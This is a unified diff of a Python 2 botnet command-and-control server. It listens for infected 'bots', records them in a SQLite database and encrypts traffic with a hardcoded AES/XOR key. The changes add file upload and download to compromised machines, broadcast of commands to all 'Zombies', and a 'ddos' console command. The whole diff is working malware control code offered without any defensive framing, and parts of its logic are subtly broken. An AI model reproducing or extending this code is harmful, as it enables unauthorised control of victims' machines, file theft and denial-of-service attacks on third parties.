@@ -1,3 +1,4 @@
+import os
 import time
 import socket
 import base64
@@ -5,7 +6,8 @@ import sqlite3
 import threading
 from Queue import Queue
 from termcolor import colored
-from Crypto.Cipher import AES
+from Crypto.Cipher import XOR, AES
+from Crypto.Hash import SHA256
 
 
 NUMBER_OF_THREADS = 2
@@ -15,20 +17,18 @@ queue = Queue()
 all_connections = []
 all_addresses = []
 
-BS = 32
-
-sock = socket.socket()
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 
 class ConnectionHandler:
     def __init__(self):
-        self.host = '127.0.0.1'
+        self.host = '0.0.0.0'
         self.port = 44353
 
     def socket_bind(self):
         try:
             sock.bind((self.host, self.port))
-            sock.listen(1000)
+            sock.listen(10000)
         except socket.error as error:
             print "[!]Error: " + str(error)
             time.sleep(5)
@@ -36,14 +36,14 @@ class ConnectionHandler:
 
     def register(self, ip):
         try:
-            con = sqlite3.connect('bots.db')
+            con = sqlite3.connect('bots.sqlite')
             cur = con.cursor()
-            cur.execute("INSERT OR IGNORE INTO bot_info (ip) VALUES (?);",  ((str(ip)), ))
+            cur.execute("INSERT OR IGNORE INTO bot_info (ip) VALUES (?);",  (str(ip)))
             con.commit()
             con.close()
         except sqlite3.Error, e:
             print e
-            print "\n[-]SQLError while adding Bot %s to Database!" %(ip)
+            print "\n[-]SQLError while adding Bot %s to Database!" % (str(ip))
 
     def accept_connections(self):
         for c in all_connections:
@@ -62,55 +62,79 @@ class ConnectionHandler:
 
 
 class FileHandler:
-    def __init__(self):
-        self.key = '{\xb9\xfed\xfc\x83\xcf\x1a:\xbe\xa7%\x0c\xa3\x88\xa8N\x7f\x89\xcd\xdf\x81\xb7\x98\xf8\x87\xdf\xab\xc5]}\xb8'
-
     def upload(self, filename, conn):
-        f = open(filename, 'rb')
-        l = f.read()
-        print l
-        Console().send(l, conn)
-        print 'Sent ', repr(l)
+        time.sleep(0.5)
+        if os.path.isfile(filename):
+            with open(filename, 'rb') as f:
+                bytesToSend = f.read(1024)
+                Console().send(bytesToSend, conn)
+                while bytesToSend:
+                    bytesToSend = f.read(1024)
+                    Console().send(bytesToSend, conn)
+        Console().send("EOF", conn)
+
+    def download(self, filename, conn):
+        data = Console().receive(conn)
+        f = open(filename, 'wb')
+        f.write(data)
+        while data:
+            data = Console().receive(conn)
+            if data == "EOF":
+                break
+            else:
+                f.write(data)
         f.close()
         return None
 
-    def download(self, filename, conn):
-        with open(filename, 'wb') as f:
-            while True:
-                data = conn.recv(1024)
-                if not data:
-                    break
-                data = Encrypt().decrypt(data, self.key)
-                f.write(data)
-        return None
 
+class EncryptionHandler:
+    def __init__(self):
+        self.pswd = "\x1f\xbf\x9fV\x1c'\xe7\xbf\xddo\x1e@@\xe7l\xce\xed\xc0\x12\xd4\xed\xdbNZ!\xd9\xb3\x81|\xa4\xe7"
+        self.padding = "{"
 
-class Encrypt:
-    def encrypt(self, key, raw):
-        pad = lambda x: x + (BS - len(x) % BS) * chr(BS - len(x) % BS)
-        raw = pad(raw)
-        iv = "q9%*LJZs<5:f]ngq"
-        cipher = AES.new(key, AES.MODE_CBC, iv)
-        return base64.b64encode(iv + cipher.encrypt(raw))
+    def _key(self):
+        key = SHA256.new(self.pswd)
+        key = key.digest()
+        return key
 
-    def decrypt(self, key, enc):
-        unpad = lambda x: x[0:-ord(x[-1])]
-        enc = base64.b64decode(enc)
-        iv = enc[:16]
-        cipher = AES.new(key, AES.MODE_CBC, iv)
-        return unpad(cipher.decrypt(enc[16:]))
+    def _pad(self, data):
+        length = len(data)
+        to_pad = 0
+        while length % 16:
+            to_pad += 1
+            length += 1
+        return data + (self.padding * to_pad)
+
+    def _unpad(self, data):
+        data = data.strip(self.padding)
+        return data
+
+    def encrypt(self, data):
+        cipher = AES.new(self._key(), AES.MODE_CTR, counter=lambda: self._key()[:16])
+        data = self._pad(data)
+        data = cipher.encrypt(data)
+        cipher = XOR.new(self._key())
+        data = cipher.encrypt(data)
+        data = base64.b64encode(data)
+        return data
+
+    def decrypt(self, data):
+        cipher = XOR.new(self._key())
+        data = base64.b64decode(data)
+        data = cipher.decrypt(data)
+        cipher = AES.new(self._key(), AES.MODE_CTR, counter=lambda: self._key()[:16])
+        data = cipher.decrypt(data)
+        data = self._unpad(data)
+        return data
 
 
 class Console:
-    def __init__(self):
-        self.key = '{\xb9\xfed\xfc\x83\xcf\x1a:\xbe\xa7%\x0c\xa3\x88\xa8N\x7f\x89\xcd\xdf\x81\xb7\x98\xf8\x87\xdf\xab\xc5]}\xb8'
-
     def usage(self):
-        usage = "\n\thelp\t\t\t\t\tShows this message\n\tlist\t\t\t\t\tLists all registered Bots\n\tselect <id>\t\t\t\tSelect a Bot by ID for single session\n\tddos <target> <type>\tDDoS target specified\n"
+        usage = "\n\thelp\t\t\t\t\tShows this message\n\tlist\t\t\t\t\tLists all registered Bots\n\tselect <id>\t\t\t\tSelect a Bot by ID for single session\n\tddos <target> <type>\tDDoS specified target\n"
         return usage
 
     def list_connections(self):
-        con = sqlite3.connect('bots.db')
+        con = sqlite3.connect('bots.sqlite')
         cur = con.cursor()
         cur.execute("SELECT * FROM bot_info")
         bot_info = cur.fetchall()
@@ -122,13 +146,13 @@ class Console:
             else:
                 status = colored("OFFLINE", "red")
                 print " [%i]   %s   [%s]" % (row[0], row[1], status)
+        con.close()
         print "\n"
 
-    def get_target(self, cmd):
+    def get_target(self, target):
         try:
-            target = cmd.replace('select', '')
             target = int(target)
-            con = sqlite3.connect('bots.db')
+            con = sqlite3.connect('bots.sqlite')
             cur = con.cursor()
             cur.execute("SELECT ip FROM bot_info WHERE id = ?", (target, ))
             ip = cur.fetchall()
@@ -143,29 +167,28 @@ class Console:
             return None
 
     def send(self, data, conn):
-        data = Encrypt().encrypt(self.key, data)
         try:
+            data = EncryptionHandler().encrypt(str(data))
             conn.send(data)
             return None
-        except socket.error:
-            print "[-]Error while sending command to Bot!"
+        except socket.error as e:
+            print e
+            print "[!]Error while sending command to Bot!"
 
     def receive(self, conn):
         try:
-            data = conn.recv(2048)
-            data = Encrypt().decrypt(self.key, str(data))
-            return str(data)
-        except socket.error:
-            print "[-]Error while receiving data from Bot!"
+            data = conn.recv(65520)
+            data = EncryptionHandler().decrypt(str(data))
+            return data
+        except socket.error as e:
+            print e
+            print "[!]Error while receiving data from Bot!"
 
     def send_target_commands(self, conn):
         while True:
             try:
                 cmd = raw_input(":: ")
                 cmd = cmd.split(" ")
-                if cmd[0] == 'quit':
-                    conn.close()
-                    self.shell()
                 if cmd[0] == 'upload':
                     print cmd
                     if len(cmd[1]) > 0:
@@ -173,28 +196,28 @@ class Console:
                         self.send(cmd, conn)
                         cmd = cmd.split(" ")
                         FileHandler().upload(str(cmd[1]), conn)
-                        print "Uploaded File!\n"
+                        print "Upload Complete!\n"
                     else:
                         print self.usage()
-                if cmd[0] == 'download':
+                elif cmd[0] == 'download':
                     if len(cmd[1]) > 0:
                         cmd = " ".join(cmd)
                         self.send(cmd, conn)
                         cmd = cmd.split(" ")
-                        FileHandler().download(cmd[1], conn)
-                        print "Downloaded File!\n"
+                        FileHandler().download(str(cmd[1]), conn)
+                        print "Download Complete!\n"
                     else:
                         print self.usage()
-                if cmd[0] == "start" or "Start":
+                elif cmd[0] == ('start' or 'Start'):
                     cmd = " ".join(cmd)
                     self.send(cmd, conn)
-                if len(cmd[0]) > 0:
+                elif len(cmd[0]) > 0:
                     cmd = " ".join(cmd)
                     self.send(cmd, conn)
                     response = self.receive(conn)
                     print response
                 else:
-                    print "[!]Error: Connection was lost!"
+                    print "[!]Error: None Type Object is not a command!"
                     break
             except socket.error as error:
                 print "[!]Error: " + str(error)
@@ -203,12 +226,13 @@ class Console:
     def shell(self):
         while True:
             cmd = raw_input(":: ")
-            if cmd == 'list':
+            cmd = cmd.split(" ")
+            if cmd[0] == 'list':
                 self.list_connections()
-            elif cmd == 'help':
+            elif cmd[0] == 'help':
                 print self.usage()
-            elif 'select' in cmd:
-                conn = self.get_target(cmd)
+            elif cmd[0] == 'select':
+                conn = self.get_target(cmd[1])
                 if conn is not None:
                     self.send_target_commands(conn)
             else:
@@ -216,9 +240,11 @@ class Console:
                     for c in all_connections:
                         self.send('exit', c)
                     exit()
+                elif cmd[0] == 'upload':
+                    ThreadHandler().add_to_threads(FileHandler().upload, cmd[1])
                 else:
-                    choice = raw_input("Send Command to all Zombies?[y/n]:: ")
-                    if choice == 'y' or 'Y':
+                    choice = raw_input("Send Command to all Zombies?[Y/N]:: ")
+                    if choice == ('y' or 'Y'):
                         for c in all_connections:
                             self.send(cmd, c)
                             print "Sent Command!\n"
@@ -227,9 +253,6 @@ class Console:
 
 
 class ThreadHandler:
-    def stop(self, thread_num):
-        threading.thread.exit()
-
     def add_to_threads(self, target, args):
         t = threading.Thread(target=target, args=args)
         t.daemon = True
@@ -263,11 +286,19 @@ class ThreadHandler:
 
 
 def create_db():
-    con = sqlite3.connect('bots.db')
-    cur = con.cursor()
-    cur.execute("CREATE TABLE IF NOT EXISTS bot_info (id integer primary key autoincrement unique, ip text)")
-    con.commit()
-    con.close()
+    if not os.path.isfile("bots.sqlite"):
+        open("bots.sqlite", "w")
+        con = sqlite3.connect('bots.sqlite')
+        cur = con.cursor()
+        cur.execute("CREATE TABLE IF NOT EXISTS bot_info (id integer primary key autoincrement unique, ip text unique)")
+        con.commit()
+        con.close()
+    else:
+        con = sqlite3.connect('bots.sqlite')
+        cur = con.cursor()
+        cur.execute("CREATE TABLE IF NOT EXISTS bot_info (id integer primary key autoincrement unique, ip text unique)")
+        con.commit()
+        con.close()
 create_db()
 
 
